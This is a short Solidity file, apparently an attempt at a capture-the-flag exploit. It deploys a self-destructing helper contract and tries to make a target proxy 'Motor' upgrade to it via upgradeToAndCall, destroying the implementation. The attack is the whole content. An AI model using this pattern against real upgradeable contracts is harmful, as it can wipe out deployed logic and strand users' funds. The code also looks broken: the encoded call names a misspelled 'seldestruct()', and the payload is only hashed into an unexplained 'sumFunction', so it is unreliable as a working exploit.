interface IMotor {
    // fallback () external payable;
    // function     (address newImplementation, bytes memory data) external payable;
    function upgrader() external view returns (address);

    function sumFunction(bytes32) external payable;
}

contract SelfDestruct {
    function selfDestruct() public {
        selfdestruct(payable(address(tx.origin)));
    }
}

contract AttackMotor {
    IMotor motor;
    SelfDestruct selfDestruct;

    constructor(address payable _motor) {
        motor = IMotor(_motor);
        selfDestruct = new SelfDestruct();
    }

    function attackMotor() public payable {
        bytes memory data = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(selfDestruct),
            abi.encodeWithSignature("seldestruct()")
        );
        bytes32 dataHash = keccak256(data);
        motor.sumFunction{value: 0}(dataHash);
    }
}

//call upgrade and call through the fallback function
//contract that has selfdestruct function, call it in data
